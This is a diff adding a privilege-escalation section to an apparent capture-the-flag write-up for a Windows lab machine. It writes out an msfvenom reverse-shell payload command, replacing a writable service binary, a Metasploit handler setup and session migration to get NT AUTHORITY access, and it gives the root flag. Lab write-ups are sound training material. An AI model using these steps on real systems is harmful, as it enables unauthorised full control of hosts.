@@ -139,3 +139,66 @@ user flag found at `C:\Users\bill\Desktop`
 
 ## Privilege Escaltion
 
+`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
+
+`AdvancedSystemCareService9`
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.96.175 LPORT=9898 -f exe -o priv9898.exe
+`
+
+upload priv9898.exe to target using upload utility of meterpreter.
+
+`meterpreter> upload /home/fc/Documents/ctf/thm/machines/steel-mountain/priv9898.exe`
+
+stop the service running (AdvancedSystemCareService9)
+
+`sc stop AdvancedSystemCareService9` (shell)
+or
+`Stop-Service AdvancedSystemCareService9` (PS)
+
+`Get-Service <Service-name>` (to get the status)
+
+replace the original ASCService.exe with generated payload
+
+`PS > copy priv9898.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`
+
+```
+open multi/handler on metaspploit
+
+use multi/handler
+set LPORT 9898
+set LHOST 10.14.96.17
+run
+```
+
+start the service (AdvancedSystemCareService9)
+
+`sc start AdvancedSystemCareService9`
+or
+`Start-Service AdvancedSystemCareService9`
+
+meterpreter session with NT Authority spawned
+
+but!
+
+sessions terminated / declined / dead after a couple of seconds
+
+so we need to migrate into a stable process 
+
+two options
+- manual
+	search for a relevant process to migrate into.
+	migrate <pid>
+	migrate -N <process_name>
+- metasploit module
+	use post/windows/manage/migrate
+	set SESSION <session-id>
+	run
+
+now we got a stable access with NT AUTHORITY privilege
+
+
+
+**Root Flag**
+
+`9af5f314f57607c00fd09803a587db80`
